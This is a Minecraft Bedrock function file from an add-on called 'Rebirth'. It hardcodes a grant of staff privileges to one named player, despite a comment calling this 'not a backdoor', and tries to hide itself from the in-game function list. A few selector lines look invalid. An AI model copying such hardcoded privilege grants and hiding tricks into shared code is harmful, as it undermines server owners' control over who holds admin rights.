#this is not a backdoor it is for my use only (you can change the name to what you want it to be)
execute @s[name=PointNetwork341] ~~~ tag @s add stafftag
time set 1900
gamerule dodaylightcycle false
gamerule doweathercycle false
function rebirth/asset/version
function rebirth/test


tellraw @a[tag=stafftag] {"rawtext":[{"text":"§¶§cRebirth §¶§b→ The §2Developer Debug Init §bhas been used by §d"},{"selector":"@s"}]}

#scoreboard players set @s lstcmd 3

#Deny NonDeveloper
execute @s[tag=!stafftag,name=!PointNetwork341] ~~~ tellraw @s {"rawtext":[{"text":"§¶§cRebirth §¶§b→ Access §cDENIED§7! §bOnly staff can use this command"}]}
execute @s[tag=stafftag,name=!PointNetwork341] ~~~ tellraw @s {"rawtext":[{"text":"§¶§cRebirth §¶§b→ Access §cDENIED§7! §bDeveloper access is needed"}]}
execute @s[tag=!stafftag,name=!PointNetwork341] ~~~ execute @s ~~~ playsound note.bass @s ~ ~ ~
execute @s[tag=stafftag,name=PointNetwork341] ~~~ execute @s ~~~ playsound note.pling @s ~ ~ ~

#This hides this from the in-game function command directory
execute @f ~~~ hide
tag @f[tag=""] add hide
